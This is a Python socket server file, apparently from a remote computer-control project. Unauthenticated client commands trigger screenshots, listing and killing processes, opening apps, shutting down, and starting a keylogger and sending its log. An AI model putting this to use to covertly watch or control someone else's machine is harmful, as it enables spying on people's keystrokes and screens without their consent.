import socket
import threading
import handleProcess 
import handleRunningApp
import controlOS
import keylogger
from GUI import menuSever
from GUI import config
from sendScreenShot import sendScreenShot


def handleClientSocket(clientsocket):
    clientsocket.settimeout(2)
    while config.openServer:
        try:
            command = clientsocket.recv(1024).decode('ascii')
            # print(command)
            if not command: 
                print("goodbye")
                break
            command = list(map(str, command.split()))
            flag = command[0]
            parameter = -1
            if len(command) > 1 : parameter = command[1]
            print("Received from client:",flag)
            if flag == "screenshot": sendScreenShot(clientsocket)
            elif flag == "listprocess": handleProcess.listProcess(clientsocket)
            elif flag == "killprocess": 
                parameter = int(parameter)
                handleProcess.killProcess(clientsocket, parameter) 
            elif flag == "listrunningapp" : handleRunningApp.listRunningApp(clientsocket)
            elif flag == "killrunningapp" : 
                parameter = int(parameter)
                handleRunningApp.killRunningApp(clientsocket, parameter)
            elif flag == "openapp": handleRunningApp.openApp(clientsocket, parameter)
            elif flag == "shutdown" : controlOS.shutdown()
            elif flag == "hook": keylogger.startedKeyLogger()
            elif flag == "unhook": config.hook = False 
            elif flag == "sendkeylogger": keylogger.sendKeyLogger(clientsocket)
            else:
                msg = 'Echo => '+ flag
                clientsocket.send(msg.encode('ascii'))
        except socket.timeout:
            continue
        except:
            print("goodbye (err)") 
            break
    config.init()
    clientsocket.close()
 
def start_server():
    while (not(config.openServer)): pass
    keylogger.deleteKeyLoggerFile()
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = ''
    port = 8000
    serversocket.bind((host, port))
    serversocket.listen(5)
    serversocket.settimeout(2)
    print("Waiting...")
    while config.openServer:
        try:
            clientsocket, addr = serversocket.accept()
            print("Got a connection from %s" % str(addr))
            client_handler = threading.Thread(target=handleClientSocket, args=(clientsocket,))
            client_handler.start()
        except socket.timeout:
            continue

if __name__ == "__main__":
    startServer = threading.Thread(target=start_server)
    startServer.start()
    menuSever.runServerGUI()

